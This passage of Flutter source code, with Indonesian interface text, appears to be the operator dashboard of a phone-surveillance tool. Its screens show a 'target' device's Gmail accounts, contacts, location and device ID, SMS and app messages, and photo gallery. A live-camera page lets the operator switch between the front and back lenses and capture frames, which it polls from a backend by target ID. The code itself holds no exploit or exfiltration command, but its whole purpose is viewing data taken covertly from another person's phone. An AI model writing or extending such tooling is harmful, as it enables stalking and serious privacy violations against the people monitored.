        borderWidth: 3,
        radius: const BorderRadius.vertical(top: Radius.circular(24)),
        padding: const EdgeInsets.fromLTRB(16, 16, 16, 24),
        child: SizedBox(
          height: MediaQuery.of(context).size.height * 0.6,
          child: Column(
            children: [
              Container(
                  width: 50,
                  height: 6,
                  decoration: BoxDecoration(
                      color: comixInk,
                      borderRadius: BorderRadius.circular(100))),
              const SizedBox(height: 14),
              ComixChip(
                bgColor: comixRed,
                child: const Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.email, color: Colors.white, size: 14),
                    SizedBox(width: 6),
                    Text('AKUN GMAIL',
                        style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w900,
                            fontSize: 11,
                            fontFamily: 'Orbitron')),
                  ],
                ),
              ),
              const SizedBox(height: 16),
              Expanded(
                child: SingleChildScrollView(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      if (accounts.isNotEmpty) ...[
                        ...accounts.map((acc) =>
                            _buildAccountItem(acc['email'], acc['type'])),
                        const SizedBox(height: 12),
                      ],
                      if (others.isNotEmpty) ...[
                        ...others.map((acc) => _buildAccountItem(
                            acc['email'], acc['type'],
                            isOther: true)),
                      ],
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildAccountItem(String email, String type, {bool isOther = false}) {
    final initial = email.isNotEmpty ? email[0].toUpperCase() : '?';
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(10),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: comixInk, width: 2),
      ),
      child: Row(
        children: [
          Container(
            width: 36,
            height: 36,
            decoration: BoxDecoration(
              color: isOther ? comixTextSub : comixRed,
              shape: BoxShape.circle,
              border: Border.all(color: comixInk, width: 2),
            ),
            child: Center(
              child: Text(initial,
                  style: const TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.w900,
                      fontSize: 14)),
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(email,
                    style: const TextStyle(
                        color: comixInk,
                        fontWeight: FontWeight.w900,
                        fontSize: 12),
                    overflow: TextOverflow.ellipsis),
                if (type.isNotEmpty)
                  Text(type,
                      style: const TextStyle(
                          color: comixTextSub,
                          fontSize: 9,
                          fontWeight: FontWeight.w700)),
              ],
            ),
          ),
          GestureDetector(
            onTap: () {
              Clipboard.setData(ClipboardData(text: email));
              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(content: Text("Email disalin!")),
              );
            },
            child: Container(
              width: 30,
              height: 30,
              decoration: BoxDecoration(
                color: comixYellow,
                shape: BoxShape.circle,
                border: Border.all(color: comixInk, width: 2),
              ),
              child: const Icon(Icons.copy, color: comixInk, size: 13),
            ),
          ),
        ],
      ),
    );
  }

  void _showContactsBottomSheet(Map<String, dynamic> data) {
    final contacts = data['contacts'] as List? ?? [];
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (context) => ComixPanel(
        bgColor: Colors.white,
        shadowOffset: 0,
        borderWidth: 3,
        radius: const BorderRadius.vertical(top: Radius.circular(24)),
        padding: const EdgeInsets.fromLTRB(16, 16, 16, 24),
        child: SizedBox(
          height: MediaQuery.of(context).size.height * 0.7,
          child: Column(
            children: [
              Container(
                  width: 50,
                  height: 6,
                  decoration: BoxDecoration(
                      color: comixInk,
                      borderRadius: BorderRadius.circular(100))),
              const SizedBox(height: 14),
              ComixChip(
                bgColor: comixOrange,
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Icon(Icons.contacts, color: Colors.white, size: 14),
                    const SizedBox(width: 6),
                    Text('KONTAK (${contacts.length})',
                        style: const TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w900,
                            fontSize: 11,
                            fontFamily: 'Orbitron')),
                  ],
                ),
              ),
              const SizedBox(height: 16),
              Expanded(
                child: contacts.isEmpty
                    ? const Center(
                        child: Text("Tidak ada kontak",
                            style: TextStyle(
                                color: comixTextSub,
                                fontFamily: 'ShareTechMono',
                                fontWeight: FontWeight.w700)),
                      )
                    : ListView.builder(
                        itemCount: contacts.length,
                        itemBuilder: (context, index) {
                          final contact = contacts[index];
                          final name = contact['name'] ?? 'Tanpa Nama';
                          final number = contact['number'] ?? '';
                          final initial =
                              name.isNotEmpty ? name[0].toUpperCase() : '?';
                          return Container(
                            margin: const EdgeInsets.only(bottom: 8),
                            padding: const EdgeInsets.all(10),
                            decoration: BoxDecoration(
                              color: Colors.white,
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: comixInk, width: 2),
                            ),
                            child: Row(
                              children: [
                                Container(
                                  width: 36,
                                  height: 36,
                                  decoration: BoxDecoration(
                                    color: comixOrange,
                                    shape: BoxShape.circle,
                                    border:
                                        Border.all(color: comixInk, width: 2),
                                  ),
                                  child: Center(
                                    child: Text(initial,
                                        style: const TextStyle(
                                            color: Colors.white,
                                            fontWeight: FontWeight.w900,
                                            fontSize: 14)),
                                  ),
                                ),
                                const SizedBox(width: 10),
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.start,
                                    children: [
                                      Text(name,
                                          style: const TextStyle(
                                              color: comixInk,
                                              fontWeight: FontWeight.w900,
                                              fontSize: 12),
                                          overflow: TextOverflow.ellipsis),
                                      if (number.isNotEmpty)
                                        Text(number,
                                            style: const TextStyle(
                                                color: comixTextSub,
                                                fontSize: 10,
                                                fontWeight:
                                                    FontWeight.w700)),
                                    ],
                                  ),
                                ),
                                if (number.isNotEmpty)
                                  GestureDetector(
                                    onTap: () {
                                      Clipboard.setData(
                                          ClipboardData(text: number));
                                      ScaffoldMessenger.of(context)
                                          .showSnackBar(
                                        const SnackBar(
                                            content: Text("Nomor disalin!")),
                                      );
                                    },
                                    child: Container(
                                      width: 30,
                                      height: 30,
                                      decoration: BoxDecoration(
                                        color: comixYellow,
                                        shape: BoxShape.circle,
                                        border: Border.all(
                                            color: comixInk, width: 2),
                                      ),
                                      child: const Icon(Icons.copy,
                                          color: comixInk, size: 13),
                                    ),
                                  ),
                              ],
                            ),
                          );
                        },
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMIX BUTTONS
// ═══════════════════════════════════════════════════════════════════════════════
class _ComixGradBtn extends StatefulWidget {
  final String label;
  final IconData? icon;
  final Color color;
  final VoidCallback onTap;

  const _ComixGradBtn({
    required this.label,
    required this.color,
    required this.onTap,
    this.icon,
  });

  @override
  State<_ComixGradBtn> createState() => _ComixGradBtnState();
}

class _ComixGradBtnState extends State<_ComixGradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) {
        setState(() => _down = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 90),
        transform: Matrix4.translationValues(_down ? 2 : 0, _down ? 2 : 0, 0),
        height: 44,
        padding: const EdgeInsets.symmetric(horizontal: 16),
        decoration: BoxDecoration(
          color: widget.color,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: comixInk, width: 2.5),
          boxShadow: [
            BoxShadow(
              color: comixInk,
              offset: Offset(_down ? 1 : 3, _down ? 1 : 3),
              blurRadius: 0,
            ),
          ],
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            if (widget.icon != null) ...[
              Icon(widget.icon, color: Colors.white, size: 16),
              const SizedBox(width: 6),
            ],
            Text(widget.label,
                style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w900,
                    fontSize: 11,
                    letterSpacing: 0.8)),
          ],
        ),
      ),
    );
  }
}

class _ComixOutlineBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  const _ComixOutlineBtn({required this.label, required this.onTap});

  @override
  State<_ComixOutlineBtn> createState() => _ComixOutlineBtnState();
}

class _ComixOutlineBtnState extends State<_ComixOutlineBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) {
        setState(() => _down = false);
        widget.onTap();
      },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 90),
        height: 44,
        decoration: BoxDecoration(
          color: _down ? comixInk.withOpacity(0.1) : Colors.white,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: comixInk, width: 2.5),
        ),
        child: Center(
          child: Text(widget.label,
              style: const TextStyle(
                  color: comixInk,
                  fontWeight: FontWeight.w900,
                  fontSize: 11,
                  letterSpacing: 0.8)),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// LOCATION FULLSCREEN PAGE — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class LocationFullscreenPage extends StatelessWidget {
  final String targetModel;
  final Map<String, dynamic> locationData;

  const LocationFullscreenPage({
    Key? key,
    required this.targetModel,
    required this.locationData,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final double? lat = locationData['lat'];
    final double? lng = locationData['lng'];
    final String address = locationData['fullAddress'] ??
        (lat != null && lng != null ? '$lat, $lng' : 'Tidak ada data');

    return Scaffold(
      backgroundColor: comixBg,
      appBar: AppBar(
        backgroundColor: comixBg,
        elevation: 0,
        flexibleSpace: Container(
          decoration: const BoxDecoration(
            border: Border(bottom: BorderSide(color: comixInk, width: 3)),
          ),
        ),
        leading: Padding(
          padding: const EdgeInsets.only(left: 8),
          child: GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              decoration: BoxDecoration(
                color: comixYellow,
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: comixInk, width: 2.5),
                boxShadow: const [
                  BoxShadow(
                      color: comixInk, offset: Offset(2.5, 2.5), blurRadius: 0),
                ],
              ),
              child:
                  const Icon(Icons.arrow_back_rounded, color: comixInk, size: 20),
            ),
          ),
        ),
        centerTitle: true,
        title: const Text('LOCATION',
            style: TextStyle(
                color: comixInk,
                fontWeight: FontWeight.w900,
                fontSize: 15,
                fontFamily: 'Orbitron',
                letterSpacing: 1.5)),
      ),
      body: Stack(
        children: [
          Positioned.fill(
            child: lat != null && lng != null
                ? _buildMapView(lat, lng)
                : Container(
                    color: comixInk.withOpacity(0.1),
                    child: const Center(
                        child: Text("Lokasi tidak tersedia",
                            style: TextStyle(
                                color: comixInk,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'Orbitron'))),
                  ),
          ),
          Positioned(
            bottom: 20,
            left: 16,
            right: 16,
            child: ComixPanel(
              bgColor: Colors.white,
              shadowOffset: 8,
              borderWidth: 3.5,
              radius: const BorderRadius.all(Radius.circular(22)),
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        width: 44,
                        height: 44,
                        decoration: BoxDecoration(
                          color: comixOrange,
                          shape: BoxShape.circle,
                          border: Border.all(color: comixInk, width: 2.5),
                          boxShadow: const [
                            BoxShadow(
                                color: comixInk,
                                offset: Offset(2, 2),
                                blurRadius: 0),
                          ],
                        ),
                        child: const Icon(Icons.location_on,
                            color: Colors.white, size: 22),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(targetModel,
                                style: const TextStyle(
                                    color: comixInk,
                                    fontWeight: FontWeight.w900,
                                    fontSize: 14,
                                    fontFamily: 'Orbitron'),
                                maxLines: 1,
                                overflow: TextOverflow.ellipsis),
                            Text('Device ID: ${locationData['deviceId'] ?? '-'}',
                                style: const TextStyle(
                                    color: comixTextSub,
                                    fontSize: 9,
                                    fontWeight: FontWeight.w700,
                                    fontFamily: 'ShareTechMono')),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 14),
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: comixYellow.withOpacity(0.25),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: comixInk, width: 2.5),
                    ),
                    child: Row(
                      children: [
                        const Icon(Icons.map_outlined,
                            color: comixInk, size: 16),
                        const SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            address,
                            style: const TextStyle(
                                color: comixInk,
                                fontSize: 11,
                                fontWeight: FontWeight.w700,
                                fontFamily: 'ShareTechMono'),
                            maxLines: 3,
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMapView(double lat, double lng) {
    final String mapUrl =
        "https://www.openstreetmap.org/export/embed.html?bbox=${lng - 0.005},${lat - 0.005},${lng + 0.005},${lat + 0.005}&layer=mapnik&marker=$lat,$lng";
    final controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse(mapUrl));
    return WebViewWidget(controller: controller);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// MESSAGE DETAIL FULLSCREEN — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class MessageDetailFullscreenPage extends StatelessWidget {
  final String appName;
  final List<dynamic> messages;
  final bool isSms;
  final String targetModel;
  final VoidCallback onBack;

  const MessageDetailFullscreenPage({
    Key? key,
    required this.appName,
    required this.messages,
    required this.isSms,
    required this.targetModel,
    required this.onBack,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: comixBg,
      appBar: AppBar(
        backgroundColor: comixBg,
        elevation: 0,
        automaticallyImplyLeading: false,
        flexibleSpace: Container(
          decoration: const BoxDecoration(
            border: Border(bottom: BorderSide(color: comixInk, width: 3)),
          ),
        ),
        leading: Padding(
          padding: const EdgeInsets.only(left: 8),
          child: GestureDetector(
            onTap: onBack,
            child: Container(
              decoration: BoxDecoration(
                color: comixYellow,
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: comixInk, width: 2.5),
                boxShadow: const [
                  BoxShadow(
                      color: comixInk, offset: Offset(2.5, 2.5), blurRadius: 0),
                ],
              ),
              child:
                  const Icon(Icons.arrow_back_rounded, color: comixInk, size: 20),
            ),
          ),
        ),
        title: Text(appName,
            style: const TextStyle(
                color: comixInk,
                fontWeight: FontWeight.w900,
                fontFamily: 'Orbitron',
                fontSize: 14)),
        centerTitle: true,
      ),
      body: Stack(
        children: [
          Positioned.fill(
            child: IgnorePointer(
                child: CustomPaint(painter: ComixHalftonePainter())),
          ),
          messages.isEmpty
              ? Center(
                  child: ComixPanel(
                    bgColor: Colors.white,
                    padding: const EdgeInsets.all(20),
                    child: const Text("Tidak ada pesan",
                        style: TextStyle(
                            color: comixInk,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'ShareTechMono')),
                  ),
                )
              : ListView.builder(
                  padding: const EdgeInsets.all(14),
                  itemCount: messages.length,
                  itemBuilder: (context, index) {
                    final msg = messages[index];
                    final time = msg['time'] is int
                        ? DateTime.fromMillisecondsSinceEpoch(msg['time'])
                        : DateTime.now();
                    final timeStr =
                        "${time.day.toString().padLeft(2, '0')}/${time.month.toString().padLeft(2, '0')}/${time.year} ${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}";

                    return Padding(
                      padding: const EdgeInsets.only(bottom: 10),
                      child: ComixPanel(
                        bgColor: Colors.white,
                        shadowOffset: 4,
                        borderWidth: 2.5,
                        radius: const BorderRadius.all(Radius.circular(14)),
                        padding: const EdgeInsets.all(12),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              mainAxisAlignment: MainAxisAlignment.spaceBetween,
                              children: [
                                ComixChip(
                                  bgColor: isSms ? comixGreen : comixPurple,
                                  child: Text(msg['title'] ?? '—',
                                      style: const TextStyle(
                                          color: Colors.white,
                                          fontWeight: FontWeight.w900,
                                          fontSize: 10,
                                          fontFamily: 'Orbitron')),
                                ),
                                Text(timeStr,
                                    style: const TextStyle(
                                        color: comixTextSub,
                                        fontSize: 9,
                                        fontWeight: FontWeight.w700,
                                        fontFamily: 'ShareTechMono')),
                              ],
                            ),
                            const SizedBox(height: 8),
                            Text(msg['text'] ?? '—',
                                style: const TextStyle(
                                    color: comixInk,
                                    fontSize: 12,
                                    fontWeight: FontWeight.w600,
                                    fontFamily: 'ShareTechMono')),
                          ],
                        ),
                      ),
                    );
                  },
                ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// GALLERY FULLSCREEN — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class GalleryFullscreenPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final Stream<List<Map<String, dynamic>>> galleryStream;
  final VoidCallback onClose;
  final VoidCallback onRefresh;
  final Function(String) onDownload;

  const GalleryFullscreenPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.galleryStream,
    required this.onClose,
    required this.onRefresh,
    required this.onDownload,
  }) : super(key: key);

  @override
  State<GalleryFullscreenPage> createState() => _GalleryFullscreenPageState();
}

class _GalleryFullscreenPageState extends State<GalleryFullscreenPage> {
  List<Map<String, dynamic>> _photos = [];
  bool _isLoading = true;
  String _currentImage = '';
  int _currentIndex = 0;
  bool _showImageViewer = false;

  @override
  void initState() {
    super.initState();
    widget.galleryStream.listen((photos) {
      if (mounted) {
        setState(() {
          _photos = photos;
          _isLoading = false;
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: comixBg,
      body: SafeArea(
        child: Stack(
          children: [
            Positioned.fill(
              child: IgnorePointer(
                  child: CustomPaint(painter: ComixHalftonePainter())),
            ),
            if (_isLoading)
              Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const SizedBox(
                        width: 50,
                        height: 50,
                        child: CircularProgressIndicator(
                            color: comixBlue, strokeWidth: 3)),
                    const SizedBox(height: 20),
                    ComixChip(
                      bgColor: comixBlue,
                      child: const Text("LOADING GALLERY...",
                          style: TextStyle(
                              color: Colors.white,
                              fontWeight: FontWeight.w900,
                              fontSize: 11,
                              fontFamily: 'ShareTechMono',
                              letterSpacing: 2)),
                    ),
                  ],
                ),
              )
            else if (_photos.isEmpty)
              Center(
                child: ComixPanel(
                  bgColor: Colors.white,
                  padding: const EdgeInsets.all(24),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(
                        width: 70,
                        height: 70,
                        decoration: BoxDecoration(
                          color: comixYellow,
                          shape: BoxShape.circle,
                          border: Border.all(color: comixInk, width: 3),
                          boxShadow: const [
                            BoxShadow(
                                color: comixInk,
                                offset: Offset(3, 3),
                                blurRadius: 0),
                          ],
                        ),
                        child: const Icon(Icons.photo_library_outlined,
                            color: comixInk, size: 32),
                      ),
                      const SizedBox(height: 16),
                      const Text("Tidak ada foto",
                          style: TextStyle(
                              color: comixInk,
                              fontWeight: FontWeight.w900,
                              fontFamily: 'Orbitron')),
                    ],
                  ),
                ),
              )
            else
              GridView.builder(
                padding: const EdgeInsets.all(10),
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 3,
                  crossAxisSpacing: 8,
                  mainAxisSpacing: 8,
                  childAspectRatio: 1,
                ),
                itemCount: _photos.length > 40 ? 40 : _photos.length,
                itemBuilder: (context, index) {
                  final photo = _photos[index];
                  final thumb = photo['thumb'] ?? '';
                  return GestureDetector(
                    onTap: () {
                      setState(() {
                        _currentIndex = index;
                        _currentImage = thumb;
                        _showImageViewer = true;
                      });
                    },
                    child: Container(
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: comixInk, width: 2.5),
                        boxShadow: const [
                          BoxShadow(
                              color: comixInk,
                              offset: Offset(2, 2),
                              blurRadius: 0),
                        ],
                      ),
                      child: ClipRRect(
                        borderRadius: BorderRadius.circular(7),
                        child: thumb.isNotEmpty
                            ? Image.memory(
                                base64Decode(thumb.contains(',')
                                    ? thumb.split(',').last
                                    : thumb),
                                fit: BoxFit.cover,
                              )
                            : Container(
                                color: comixYellow.withOpacity(0.3),
                                child: const Icon(
                                    Icons.image_not_supported,
                                    color: comixInk),
                              ),
                      ),
                    ),
                  );
                },
              ),

            // Header
            Positioned(
              top: 10,
              left: 10,
              right: 10,
              child: Row(
                children: [
                  GestureDetector(
                    onTap: widget.onClose,
                    child: Container(
                      width: 42,
                      height: 42,
                      decoration: BoxDecoration(
                        color: comixRed,
                        borderRadius: BorderRadius.circular(11),
                        border: Border.all(color: comixInk, width: 2.5),
                        boxShadow: const [
                          BoxShadow(
                              color: comixInk,
                              offset: Offset(2.5, 2.5),
                              blurRadius: 0),
                        ],
                      ),
                      child:
                          const Icon(Icons.close, color: Colors.white, size: 20),
                    ),
                  ),
                  const SizedBox(width: 10),
                  ComixChip(
                    bgColor: comixYellow,
                    child: Text("GALLERY (${_photos.length})",
                        style: const TextStyle(
                            color: comixInk,
                            fontWeight: FontWeight.w900,
                            fontSize: 11,
                            fontFamily: 'Orbitron')),
                  ),
                  const Spacer(),
                  GestureDetector(
                    onTap: () {
                      setState(() => _isLoading = true);
                      widget.onRefresh();
                    },
                    child: Container(
                      width: 42,
                      height: 42,
                      decoration: BoxDecoration(
                        color: comixBlue,
                        borderRadius: BorderRadius.circular(11),
                        border: Border.all(color: comixInk, width: 2.5),
                        boxShadow: const [
                          BoxShadow(
                              color: comixInk,
                              offset: Offset(2.5, 2.5),
                              blurRadius: 0),
                        ],
                      ),
                      child: const Icon(Icons.refresh_rounded,
                          color: Colors.white, size: 20),
                    ),
                  ),
                ],
              ),
            ),

            // Image viewer
            if (_showImageViewer && _currentImage.isNotEmpty)
              Container(
                color: Colors.black.withOpacity(0.95),
                child: Stack(
                  children: [
                    Center(
                      child: InteractiveViewer(
                        minScale: 0.5,
                        maxScale: 4.0,
                        child: Image.memory(
                          base64Decode(_currentImage.contains(',')
                              ? _currentImage.split(',').last
                              : _currentImage),
                          fit: BoxFit.contain,
                        ),
                      ),
                    ),
                    Positioned(
                      top: 10,
                      right: 10,
                      child: GestureDetector(
                        onTap: () =>
                            setState(() => _showImageViewer = false),
                        child: Container(
                          width: 42,
                          height: 42,
                          decoration: BoxDecoration(
                            color: comixRed,
                            borderRadius: BorderRadius.circular(11),
                            border: Border.all(color: comixInk, width: 2.5),
                          ),
                          child: const Icon(Icons.close,
                              color: Colors.white, size: 20),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// LIVE CAMERA PAGE — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class LiveCameraPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Stream<String> frameStream;
  final bool isLoading;
  final Function(String) onSwitchCamera;
  final VoidCallback onCapture;

  const LiveCameraPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.frameStream,
    required this.isLoading,
    required this.onSwitchCamera,
    required this.onCapture,
  }) : super(key: key);

  @override
  State<LiveCameraPage> createState() => _LiveCameraPageState();
}

class _LiveCameraPageState extends State<LiveCameraPage> {
  String _currentFrame = '';
  bool _isLoading = true;
  int _fps = 0;
  int _frameCount = 0;
  DateTime _lastFpsCheck = DateTime.now();
  String _currentFacing = '';

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    widget.frameStream.listen((frame) {
      if (!mounted) return;
      _frameCount++;
      final now = DateTime.now();
      final diff = now.difference(_lastFpsCheck).inMilliseconds;
      if (diff >= 1000) {
        setState(() {
          _fps = (_frameCount * 1000 / diff).round();
          _frameCount = 0;
          _lastFpsCheck = now;
        });
      }
      setState(() {
        _currentFrame = frame;
        _isLoading = false;
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          if (_currentFrame.isNotEmpty)
            RepaintBoundary(
              child: InteractiveViewer(
                minScale: 0.5,
                maxScale: 4.0,
                child: Image.memory(
                  base64Decode(_currentFrame.split(',').last),
                  fit: BoxFit.cover,
                  gaplessPlayback: true,
                ),
              ),
            )
          else
            Center(
              child: ComixPanel(
                bgColor: Colors.white,
                padding: const EdgeInsets.all(20),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const SizedBox(
                        width: 50,
                        height: 50,
                        child: CircularProgressIndicator(
                            color: comixCyan, strokeWidth: 3)),
                    const SizedBox(height: 14),
                    const Text('MENGHUBUNGKAN...',
                        style: TextStyle(
                            color: comixInk,
                            fontWeight: FontWeight.w900,
                            fontSize: 11,
                            fontFamily: 'ShareTechMono',
                            letterSpacing: 2)),
                  ],
                ),
              ),
            ),
          // Top HUD
          Positioned(
            top: 0, left: 0, right: 0,
            child: Container(
              padding: EdgeInsets.only(
                top: MediaQuery.of(context).padding.top + 12,
                left: 14, right: 14, bottom: 16,
              ),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [Colors.black.withOpacity(0.8), Colors.transparent],
                ),
              ),
              child: Row(
                children: [
                  ComixChip(
                    bgColor: comixRed,
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Container(
                            width: 7,
                            height: 7,
                            decoration: const BoxDecoration(
                                color: Colors.white,
                                shape: BoxShape.circle)),
                        const SizedBox(width: 5),
                        const Text('LIVE',
                            style: TextStyle(
                                color: Colors.white,
                                fontSize: 10,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'Orbitron',
                                letterSpacing: 1)),
                      ],
                    ),
                  ),
                  const SizedBox(width: 8),
                  ComixChip(
                    bgColor: comixBlue,
                    child: Text('$_fps FPS',
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 9,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'ShareTechMono')),
                  ),
                  const Spacer(),
                  GestureDetector(
                    onTap: widget.onClose,
                    child: Container(
                      width: 38,
                      height: 38,
                      decoration: BoxDecoration(
                        color: comixRed,
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: comixInk, width: 2.5),
                      ),
                      child: const Icon(Icons.close,
                          color: Colors.white, size: 18),
                    ),
                  ),
                ],
              ),
            ),
          ),
          // Bottom bar
          Positioned(
            bottom: 0, left: 0, right: 0,
            child: Container(
              padding: EdgeInsets.only(
                bottom: MediaQuery.of(context).padding.bottom + 20,
                top: 24, left: 28, right: 28,
              ),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.bottomCenter,
                  end: Alignment.topCenter,
                  colors: [Colors.black.withOpacity(0.85), Colors.transparent],
                ),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  GestureDetector(
                    onTap: () {
                      final nf =
                          _currentFacing == 'front' ? 'back' : 'front';
                      setState(() => _currentFacing = nf);
                      widget.onSwitchCamera(nf);
                    },
                    child: Container(
                      width: 54,
                      height: 54,
                      decoration: BoxDecoration(
                        color: comixCyan,
                        shape: BoxShape.circle,
                        border: Border.all(color: comixInk, width: 3),
                        boxShadow: const [
                          BoxShadow(
                              color: comixInk,
                              offset: Offset(3, 3),
                              blurRadius: 0),
                        ],
                      ),
                      child: const Icon(Icons.switch_camera_rounded,
                          color: Colors.white, size: 24),
                    ),
                  ),
                  GestureDetector(
                    onTap: widget.onCapture,
                    child: Container(
                      width: 68,
                      height: 68,
                      decoration: BoxDecoration(
                        color: Colors.white,
                        shape: BoxShape.circle,
                        border: Border.all(color: comixInk, width: 3.5),
                        boxShadow: const [
                          BoxShadow(
                              color: comixInk,
                              offset: Offset(4, 4),
                              blurRadius: 0),
                        ],
                      ),
                      child: const Icon(Icons.camera_alt_rounded,
                          color: comixInk, size: 30),
                    ),
                  ),
                  GestureDetector(
                    onTap: widget.onClose,
                    child: Container(
                      width: 54,
                      height: 54,
                      decoration: BoxDecoration(
                        color: comixRed,
                        shape: BoxShape.circle,
                        border: Border.all(color: comixInk, width: 3),
                        boxShadow: const [
                          BoxShadow(
                              color: comixInk,
                              offset: Offset(3, 3),
                              blurRadius: 0),
                        ],
                      ),
                      child: const Icon(Icons.stop_rounded,
                          color: Colors.white, size: 24),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// LIVE CAMERA POLLING PAGE — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class LiveCameraPollingPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Function(String) onSwitchCamera;

  const LiveCameraPollingPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.onSwitchCamera,
  }) : super(key: key);

  @override
  State<LiveCameraPollingPage> createState() => _LiveCameraPollingPageState();
}

class _LiveCameraPollingPageState extends State<LiveCameraPollingPage> {
  String _currentFrame = '';
  bool _isLoading = true;
  Timer? _pollingTimer;
  String _currentFacing = '';

  @override
  void initState() {
    super.initState();
    _currentFacing = widget.facing;
    _fetchFrame();
    _pollingTimer = Timer.periodic(const Duration(seconds: 2), (timer) {
      _fetchFrame();
    });
  }

  Future<void> _fetchFrame() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';
      final response = await http.get(
        Uri.parse(
            "$baseUrl/api/live-camera/${widget.targetId}?facing=$_currentFacing"),
